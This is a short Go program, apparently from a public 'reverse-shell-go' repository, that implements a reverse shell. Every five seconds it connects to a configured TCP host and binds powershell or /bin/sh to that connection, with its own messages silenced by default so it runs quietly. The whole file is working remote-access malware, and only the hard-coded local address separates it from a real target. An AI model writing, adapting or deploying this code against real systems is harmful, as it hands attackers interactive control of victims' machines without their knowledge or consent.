package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"
)

// delay sets the time period between connection attempts
const delay = 5

// host sets the address of the server to connect to
const host = "127.0.0.1:8080"

// debug sets if program should provide output
const debug = false

func main() {
	if debug {
		Println("starting in debug mode")
	}
	Println("github.com/orf1/reverse-shell-go")
	for {
		time.Sleep(delay * time.Second)
		connect()
	}
}

// connect attempts to send a shell to a remote server
func connect() {
	// attempts to establish a tcp connection with server
	Println("attempting to establish tcp connection with server")
	con, err := net.Dial("tcp", host)
	if err != nil {
		Println(err.Error())
		return
	}
	Println("connection established")

	cmd := getOsCmd()

	// binds stdin, stdout, and stderr to connection
	fmt.Println("binding standard interfaces to connection")
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con

	// opens shell
	Println("shell opened")
	err = cmd.Run()
	if err != nil {
		Println(err.Error())
		return
	}
	Println("shell closed")
}

func getOsCmd() *exec.Cmd {
	Println("detecting operating system")
	if runtime.GOOS == "windows" {
		Println("detected windows, using powershell")
		return exec.Command("powershell")
	} else {
		Println("detected mac or linux, using /bin/sh")
		return exec.Command("/bin/sh", "-i")
	}
}

func Println(text string) {
	if debug {
		fmt.Println(text)
	}
}
